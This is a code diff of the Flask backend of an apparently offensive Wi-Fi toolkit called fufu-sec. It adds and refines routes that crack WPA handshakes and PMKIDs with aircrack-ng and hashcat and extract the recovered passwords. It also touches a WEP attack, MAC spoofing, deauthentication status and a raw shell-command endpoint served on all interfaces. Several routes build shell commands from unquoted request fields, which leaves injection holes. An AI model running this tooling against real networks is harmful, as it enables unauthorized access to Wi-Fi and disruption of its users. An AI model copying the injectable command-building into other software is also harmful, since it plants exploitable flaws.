         if "invalid argument" in lo:
             diag.append("Kernel rejected the operation — interface state invalid; try re-enabling monitor mode")
         if "no answer" in lo and "found 0 ap" in lo:
-            diag.append("No APs found nearby — move closer to a target network")
+            # If we already warned about Intel/Realtek, "Found 0 APs" is the
+            # expected result of a non-injectable adapter — not a range issue
+            if _no_inject_warn:
+                diag.append("'Found 0 APs' confirms this adapter cannot inject "
+                             "— the driver limitation warning above explains why")
+            else:
+                diag.append("No APs responded — either no APs in range, or adapter "
+                             "does not support injection. Move closer to an AP or use "
+                             "an injection-capable adapter (Alfa AWUS036ACH)")
         if "no such device" in lo:
             diag.append(f"Interface '{iface}' disappeared — kernel driver may have reset it")
         if "operation not supported" in lo or "not supported" in lo:
@@ -1626,12 +2050,109 @@ def dos_status():
     return jsonify({"running": running, "any_active": any(running.values())})
 
 
+def _extract_password(text):
+    """
+    Extract cracked password from hashcat output.
+
+    Handles these output formats:
+      1. WPA 22000 PMKID/EAPOL:  WPA*02*<hex>*<mac>*<mac>*<ssid_hex>*...:PASSWORD
+      2. Standard MD5/SHA line:  <hash32+>:PASSWORD
+      3. hashcat --show output:  same as above
+
+    SKIPS:
+      - GPU / OpenCL device info lines  (contain MHz, MCU, allocatable, GHz, Core(TM))
+      - hashcat status/header lines     (Session, Status, Speed, Recovered, Progress…)
+      - Lines that are clearly not crack results
+
+    This fixes the bug where hashcat's GPU device string was returned as
+    the "password" because the old regex matched any line with 20+ hex/colon
+    characters before a colon-separated suffix.
+    """
+    GPU_MARKERS = re.compile(
+        r"MHz|MCU|allocatable|GHz|Core\(TM\)|skylake|avx512|avx2|"
+        r"i\d-\d{4}|Radeon|GeForce|OpenCL|CUDA|Device\s+#|"
+        r"Adapter\s+#|Intel\(R\)|AMD\s+Radeon",
+        re.IGNORECASE,
+    )
+    STATUS_PREFIXES = (
+        "Session", "Status", "Hash.Mode", "Hash.Target", "Time.",
+        "Speed.", "Recovered", "Progress", "Rejected", "Restore.",
+        "Started", "Stopped", "Guess.", "Candidate", "Hardware",
+        "Watchdog", "Host", "Kernel", "Accel", "Loop", "Thr", "Vec",
+        "Power", "Temp", "Util", "Fan", "Memory", "Bus", "Platform",
+        "Backend", "Approaching", "[s]", "==>", "-- ", "INFO",
+    )
+
+    for line in text.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        # Hard-skip GPU device / status lines before any pattern matching
+        if GPU_MARKERS.search(line):
+            continue
+        if any(line.startswith(p) for p in STATUS_PREFIXES):
+            continue
+        # Skip lines that have no colon at all (can't be a crack result)
+        if ":" not in line:
+            continue
+
+        # ── Format 1: WPA 22000 ──────────────────────────────────────────
+        # WPA*02*<PMKID32>*<MAC12>*<MAC12>*<SSID_hex>*<flags>*<eapol_hex>:PASSWORD
+        # WPA*01*<MIC32>*<MAC12>*<MAC12>*<SSID_hex>*<nonce>*<eapol>:PASSWORD
+        m = re.match(
+            r"^WPA\*[0-9A-Fa-f]+\*[0-9A-Fa-f]+\*[0-9A-Fa-f]+\*[0-9A-Fa-f]*\*"
+            r"[^:]*:(.{1,63})$",
+            line,
+        )
+        if m:
+            pw = m.group(1).strip()
+            if pw:
+                return pw
+
+        # ── Format 2: standard hash:password ─────────────────────────────
+        # Left side must be a pure hex string of 32+ chars (MD5 / SHA family)
+        m2 = re.match(r"^([a-f0-9]{32,})(?::[a-f0-9]{32,})*:(.{1,63})$", line, re.IGNORECASE)
+        if m2:
+            pw = m2.group(2).strip()
+            if pw:
+                return pw
+
+        # ── Format 3: colon-split fallback for any hash-like left side ───
+        # Only accept if left side looks like a hash (all hex, or contains *)
+        parts = line.split(":")
+        if len(parts) >= 2:
+            left  = parts[0].strip()
+            right = parts[-1].strip()
+            left_is_hash = (
+                re.match(r"^[a-f0-9]{32,}$", left, re.IGNORECASE) or
+                left.startswith("WPA*") or
+                re.match(r"^[a-f0-9*]{30,}$", left, re.IGNORECASE)
+            )
+            if left_is_hash and right and len(right) >= 1:
+                # Extra guard: reject if right side looks like GPU device info
+                if not GPU_MARKERS.search(right):
+                    return right
+
+    return None
+
+
 # ── CRACKING ─────────────────────────────────────────────────────────────────
 
 @app.route("/api/crack/aircrack", methods=["POST"])
 def crack_aircrack():
     data = request.json or {}
-    capfile  = (data.get("capfile") or "").strip() or state.get("last_cap_file","")
+    # Prefer last confirmed handshake cap (never overwritten by monitor capture)
+    # Fall back to last_cap_file, then scan /tmp for the most recent .cap
+    capfile = (data.get("capfile") or "").strip()
+    if not capfile:
+        capfile = state.get("last_hs_cap_file","") or state.get("last_cap_file","")
+    # If cap is monitor capture (capture-01.cap) and a hs_ file exists, prefer that
+    if capfile.endswith("capture-01.cap") or not os.path.exists(capfile):
+        hs_caps = sorted(
+            [TMPDIR+f for f in os.listdir(TMPDIR) if f.endswith(".cap") and f.startswith("hs")],
+            key=os.path.getmtime, reverse=True
+        )
+        if hs_caps: capfile = hs_caps[0]
     wordlist = data.get("wordlist","/usr/share/wordlists/rockyou.txt")
     bssid    = (data.get("bssid") or "").strip()
     if not os.path.exists(capfile):
@@ -1639,20 +2160,27 @@ def crack_aircrack():
         return jsonify({"error": f"Cap not found: {capfile}. "+("Available: "+", ".join(available) if available else "No cap files")})
     if not os.path.exists(wordlist): return jsonify({"error": f"Wordlist not found: {wordlist}"})
     if not _safe_path(capfile, "/tmp/fufu-sec"): return jsonify({"error": "Invalid path"}), 400
-    _hs_ok, _hs_raw, _ = _ac_verify(capfile, bssid)
-    if not _hs_ok and bssid:
-        # BSSID-specific verify failed — retry without BSSID filter.
-        # The file may contain a valid handshake for this AP even if the
-        # BSSID string matching is off (case, colons, etc.)
-        _hs_ok_any, _hs_raw_any, _ = _ac_verify(capfile, "")
-        if _hs_ok_any:
-            _hs_ok  = True
-            _hs_raw = _hs_raw_any
-            log.info(f"crack_aircrack: HS confirmed without BSSID filter — proceeding")
-    if not _hs_ok:
+    _hs_result, _hs_raw, _ = _ac_verify(capfile, bssid)
+    # If 0 potential targets with BSSID filter → BSSID mismatch (e.g. old-format
+    # cap files like hs1-02.cap). Retry without -b flag to find any handshake.
+    if _hs_result is not True and bssid:
+        _hs_any, _hs_raw_any, _ = _ac_verify(capfile, "")
+        if _hs_any is True:
+            log.info("crack_aircrack: BSSID filter found nothing — retried without filter")
+            _hs_result = True; _hs_raw = _hs_raw_any
+        elif _hs_any == "pmkid":
+            _hs_result = "pmkid"; _hs_raw = _hs_raw_any
+    if _hs_result == "pmkid":
         return jsonify({"output": _hs_raw or "(no output)",
-                        "error": ("No complete 4-way handshake found in this file. "
-                                  "Capture again or verify the .cap with the Verify tab.")})
+                        "error": ("This file contains a PMKID but no 4-way handshake. "
+                                  "aircrack-ng cannot crack PMKID. "
+                                  "Use the PMKID tab → Convert → hashcat -m 22000.")})
+    if _hs_result is not True:
+        return jsonify({"output": _hs_raw or "(no output)",
+                        "error": ("No 4-way handshake found — 0 potential targets. "
+                                  "The BSSID in the form may not match the captured AP. "
+                                  "Try selecting the .cap file from the Captured Files list, "
+                                  "or re-capture with the correct target.")})
     audit("CRACK_AIRCRACK", f"cap={capfile} bssid={bssid}")
     cmd  = f"aircrack-ng '{capfile}' -w '{wordlist}' {'-b '+bssid if bssid else ''} 2>&1"
     proc = run_bg("aircrack", cmd)
@@ -1695,10 +2223,32 @@ def crack_hashcat():
     cmd = f"hashcat -m {mode} -a {attack} {hashfile} {wordlist} {rules_flag} {mask_flag} --potfile-path {pot} --status --status-timer=5 2>&1"
     proc = run_bg("hashcat", cmd)
     output = read_output(proc, timeout=120)
-    key_m = re.search(r"([a-f0-9]{32}[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:([^\n]+))", output, re.IGNORECASE)
-    if key_m: audit("HASHCAT_CRACKED", f"hash={hashfile}")
-    return jsonify({"output": output, "password": key_m.group(2).strip() if key_m else None,
-                    "success": f"CRACKED: {key_m.group(2).strip()}" if key_m else None})
+
+    # Check potfile and extract password
+    already_in_pot = ("All hashes found as potfile" in output or
+                      "potfile and/or empty entries" in output)
+    password = _extract_password(output)
+
+    if not password and already_in_pot:
+        # Retrieve from potfile using hashcat --show
+        show_cmd = f"hashcat -m {mode} {hashfile} --potfile-path {pot} --show 2>&1"
+        show_out, _, _ = run_cmd(show_cmd, timeout=15)
+        output += f"\n\n--- Potfile lookup ---\n{show_out}"
+        password = _extract_password(show_out)
+        if password:
+            output += f"\n[+] Password retrieved from potfile: {password}"
+
+    if password:
+        audit("HASHCAT_CRACKED", f"hash={hashfile} pwd=***")
+
+    return jsonify({
+        "output":   output,
+        "password": password,
+        "success":  f"CRACKED: {password}" if password else None,
+        "potfile":  already_in_pot,
+        "note":     ("Hash was already cracked and found in potfile." if already_in_pot and password else
+                     "Hash in potfile but could not extract password — run manually: hashcat --show" if already_in_pot else None),
+    })
 
 
 @app.route("/api/crack/john", methods=["POST"])
@@ -1753,7 +2303,37 @@ def crack_convert():
 
     # Check for handshake / PMKID in the file
     has_hs, _, _ = _ac_verify(capfile)
-    out.append(f"[*] Handshake check: {'FOUND' if has_hs else 'NOT FOUND (may still contain PMKID)'}")
+    out.append(f"[*] Handshake check: {'FOUND' if has_hs is True else 'NOT FOUND (may still contain PMKID)'}")
+
+    # ── DLT detection + radiotap fix ────────────────────────────────────
+    # hcxpcapngtool requires DLT_IEEE802_11_RADIO (radiotap headers).
+    # Realtek rtl8xxxu and some other drivers capture DLT_IEEE802_11 (raw
+    # 802.11 without radiotap). aircrack-ng works fine with either DLT;
+    # hcxpcapngtool does not — it silently writes no hashes.
+    # Fix: if capinfos reports no radiotap, run editcap -T ieee-802-11-radio
+    # to add synthetic radiotap headers before passing to hcxpcapngtool.
+    work_cap = capfile   # may be replaced by radiotap-fixed version below
+    if tool_exists("capinfos") and tool_exists("editcap") and capfile.endswith(".cap"):
+        dlt_info, _, _ = run_cmd(f"capinfos -t '{capfile}' 2>&1", timeout=10)
+        is_raw_80211  = ("802.11" in dlt_info and
+                         "Radiotap" not in dlt_info and
+                         "DLT_IEEE802_11_RADIO" not in dlt_info and
+                         "105" in dlt_info)
+        if is_raw_80211:
+            rt_cap = capfile.replace(".cap", "_rt.cap")
+            out.append("[!] DLT_IEEE802_11 (no radiotap) detected — Realtek driver limitation")
+            out.append(f"[*] Running: editcap -T ieee-802-11-radio {capfile} {rt_cap}")
+            _, _, ec = run_cmd(f"editcap -T ieee-802-11-radio '{capfile}' '{rt_cap}' 2>&1", timeout=15)
+            if ec == 0 and os.path.exists(rt_cap) and os.path.getsize(rt_cap) > 0:
+                work_cap = rt_cap
+                out.append(f"[*] Radiotap headers added → using: {rt_cap}")
+            else:
+                out.append("[!] editcap failed — trying direct conversion (may still work)")
+        else:
+            out.append(f"[*] DLT: radiotap headers present — OK")
+    elif not tool_exists("capinfos"):
+        out.append("[!] capinfos not found (part of wireshark-common) — cannot check DLT")
+        out.append("    If conversion fails: sudo apt install wireshark-common")
 
     # Convert to 22000 format
     outfile_22000 = re.sub(r"\.(cap|pcapng)$", "_22000.txt", capfile)
@@ -1761,7 +2341,7 @@ def crack_convert():
         outfile_22000 = capfile + "_22000.txt"
 
     conv_out, conv_err, conv_rc = run_cmd(
-        f"hcxpcapngtool -o '{outfile_22000}' '{capfile}' 2>&1", timeout=30)
+        f"hcxpcapngtool -o '{outfile_22000}' '{work_cap}' 2>&1", timeout=30)
     hcx_ok  = (conv_rc == 0 and os.path.exists(outfile_22000)
                and os.path.getsize(outfile_22000) > 0)
     no_hash = "no hashes written" in conv_out.lower()
@@ -1788,12 +2368,16 @@ def crack_convert():
     else:
         reasons = []
         if no_hash:                          reasons.append("No PMKID or EAPOL frames in file")
-        if "radiotap" in conv_out.lower():   reasons.append("Missing radiotap headers — recapture with pcap+csv format")
+        if "radiotap" in conv_out.lower():
+            reasons.append("Missing radiotap headers (Realtek driver)")
+            out.append("[!] Fix: install wireshark-common then retry (editcap auto-adds radiotap)")
+            out.append("    sudo apt install wireshark-common")
         if "authentication" in conv_out.lower(): reasons.append("Missing auth frames — capture was too short")
-        if not has_hs:                       reasons.append("No complete 4-way handshake detected")
+        if has_hs is not True:               reasons.append("No complete 4-way handshake detected")
         if not reasons:                      reasons.append("File may only contain beacon frames")
         out += [f"[!] {r}" for r in reasons]
         out.append("[*] TIP: Capture longer · send deauth · verify handshake first")
+        out.append("[*] TIP: Install wireshark-common for DLT auto-fix: sudo apt install wireshark-common")
         return jsonify({"output": "\n".join(out),
                         "error": "Conversion failed: " + " | ".join(reasons)})
 
@@ -1817,7 +2401,7 @@ def list_wordlists():
 # Mirrors airgeddon autoupdate_check() — fetches server.py from main branch,
 # reads the version string and compares to running version.
 
-FUFU_VERSION  = "3.5.0"
+FUFU_VERSION  = "3.11.3"
 FUFU_REPO_RAW = "https://raw.githubusercontent.com/kyllr-qwen/fufu-sec/main/server.py"
 FUFU_REPO_URL = "https://github.com/kyllr-qwen/fufu-sec"
 
@@ -1828,8 +2412,6 @@ def update_check():
     Mirrors airgeddon autoupdate_check() but uses Python urllib (no curl dependency).
     Handles repos that have no releases yet gracefully.
     """
-    import urllib.request, urllib.error, json as _json
-
     result = {
         "current_version": FUFU_VERSION,
         "latest_version":  None,
@@ -1848,7 +2430,7 @@ def update_check():
     try:
         req = urllib.request.Request(api_url, headers=_headers)
         with urllib.request.urlopen(req, timeout=10) as resp:
-            data = _json.loads(resp.read().decode("utf-8"))
+            data = json.loads(resp.read().decode("utf-8"))
         tag = data.get("tag_name", "").lstrip("v").strip()
         if tag:
             result.update({"latest_version": tag,
@@ -1901,14 +2483,17 @@ def update_check():
 # xterm/lspci: airgeddon requires these for its terminal windows,
 # but fufu-sec uses a browser terminal — xterm not needed here.
 ESSENTIAL_TOOLS = ["iw","awk","airmon-ng","airodump-ng","aircrack-ng","ip","ps","aireplay-ng","mdk4"]
-# beef-xss excluded: it is a browser-exploitation tool (requires Ruby/Node), not a wireless tool
+# OPTIONAL_TOOLS: tools used by specific features but not required for core capture/crack.
+# Removed from list: aireplay-ng, mdk4 (already ESSENTIAL); wpaclean, etterlog,
+# lighttpd, hcxhash2cap, hcxhashtool (no route references them — install via hcxtools).
 OPTIONAL_TOOLS  = [
-    "wpaclean", "crunch",    "aireplay-ng",   "mdk4",        "hashcat",
-    "hostapd",  "dhcpd",     "nft",           "ettercap",    "etterlog",
-    "lighttpd", "dnsmasq",   "wash",          "reaver",      "bully",
-    "pixiewps",  "bettercap", "packetforge-ng", "hostapd-wpe", "asleap",
-    "john",     "openssl",   "hcxpcapngtool", "hcxdumptool", "tshark",
-    "tcpdump",  "besside-ng","hostapd-mana","hcxhash2cap","hcxhashtool",
+    "crunch",       "hashcat",       "john",          "openssl",
+    "hostapd",      "dnsmasq",       "dhcpd",         "nft",
+    "wash",         "reaver",        "bully",         "pixiewps",
+    "hcxdumptool",  "hcxpcapngtool", "tcpdump",       "tshark",
+    "ettercap",     "bettercap",     "packetforge-ng", "besside-ng",
+    "hostapd-wpe",  "hostapd-mana",  "asleap",
+    "capinfos",     "editcap",
 ]
 
 @app.route("/api/deps")
@@ -1930,7 +2515,10 @@ def raw_exec():
             return jsonify({"error": f"Blocked command: {blocked}"})
     audit("EXEC", f"cmd={cmd[:120]}")
     stdout, stderr, rc = run_cmd(cmd, timeout=30)
-    return jsonify({"output": stdout+stderr, "returncode": rc, "error": None if rc==0 else f"Exit code {rc}"})
+    combined = (stdout + stderr)[:8000]  # cap output at 8KB to protect browser
+    if len(stdout+stderr) > 8000:
+        combined += f"\n[...truncated — {len(stdout+stderr)} bytes total]"
+    return jsonify({"output": combined, "returncode": rc, "error": None if rc==0 else f"Exit code {rc}"})
 
 
 # ── SYSTEM INFO ───────────────────────────────────────────────────────────────
@@ -1950,7 +2538,7 @@ def system_info():
                             return total, idle
                 return 0, 0
             t1, i1 = _read_stat()
-            import time as _t; _t.sleep(0.25)
+            time.sleep(0.25)
             t2, i2 = _read_stat()
             dt = t2-t1; di = i2-i1
             if dt > 0:
@@ -2064,7 +2652,6 @@ def chan_hop_stop():
 def mac_spoof():
     data = request.json or {}; iface = data.get("interface") or get_active_iface(); mac = data.get("mac","random")
     if mac == "random":
-        import random
         mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
     audit("MAC_SPOOF", f"iface={iface} mac={mac}")
     out, _, rc = run_cmd(f"ip link set {iface} down && ip link set {iface} address {mac} && ip link set {iface} up 2>&1")
@@ -2156,8 +2743,7 @@ def wep_attack():
         proc = run_bg("wep_fakeauth", cmd); time.sleep(2); running = proc.poll() is None
         out = ""
         try:
-            import select as _sel
-            if _sel.select([proc.stdout],[],[],2)[0]:
+            if select.select([proc.stdout],[],[],2)[0]:
                 for _ in range(6):
                     l = proc.stdout.readline()
                     if not l: break
@@ -2234,6 +2820,10 @@ def wep_crack():
         available = sorted([os.path.join(TMPDIR,f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
         return jsonify({"error": f"Cap not found: {capfile}. "+("Available: "+", ".join(available) if available else "No cap files")})
     if not _safe_path(capfile, "/tmp/fufu-sec"): return jsonify({"error": "Invalid path"}), 400
+    # Sanitize mode — whitelist only valid aircrack-ng WEP flags to prevent shell injection
+    ALLOWED_WEP_MODES = {"", "-l 64", "-l 128", "-K", "-z", "-Z", "-a 1", "-n 64", "-n 128"}
+    if mode not in ALLOWED_WEP_MODES:
+        return jsonify({"error": f"Invalid WEP mode flag: {mode!r}"}), 400
     audit("WEP_CRACK", f"cap={capfile}")
     proc = run_bg("aircrack_wep", f"aircrack-ng {mode} '{capfile}' 2>&1")
     output = re.sub(r"\x1b\[[0-9;]*m|\[\d+K", "", read_output(proc, timeout=180))
@@ -2249,8 +2839,7 @@ def wep_crack():
 # ─────────────────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
-    import argparse as _ap
-    _parser = _ap.ArgumentParser(description="fufu-sec backend")
+    _parser = argparse.ArgumentParser(description="fufu-sec backend")
     _parser.add_argument("--port", type=int, default=5000, help="Port to listen on (default: 5000)")
     _parser.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
     _args, _ = _parser.parse_known_args()
@@ -2260,7 +2849,7 @@ if __name__ == "__main__":
         print("   Run: sudo python3 server.py\n")
 
     try:
-        from flask_cors import CORS as _check
+        import flask_cors  # verify installed
     except ImportError:
         print("Installing flask and flask-cors...")
         os.system("pip3 install flask flask-cors --break-system-packages -q")
